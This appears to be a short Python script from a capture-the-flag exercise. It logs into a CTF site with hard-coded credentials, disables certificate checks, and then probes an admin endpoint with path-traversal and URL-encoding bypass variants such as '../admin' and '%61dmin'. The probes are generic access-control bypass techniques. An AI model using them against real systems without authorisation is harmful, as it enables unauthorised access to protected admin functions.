import requests

session = requests.Session()
url_login = "https://ctf.marabit.xyz/api/auth/login"
data = {"email": "analyst@blackarchive.local", "password": "ArchiveAccess2026!"}
session.post(url_login, json=data, verify=False)

urls = [
    "https://ctf.marabit.xyz/api/documents/../admin/overview",
    "https://ctf.marabit.xyz/api/auth/../admin/overview",
    "https://ctf.marabit.xyz/api/%61dmin/overview",
    "https://ctf.marabit.xyz/api/admin%2foverview",
    "https://ctf.marabit.xyz/api/admin/overview/"
]

for u in urls:
    r = session.get(u, verify=False)
    print(u, r.status_code, r.text)
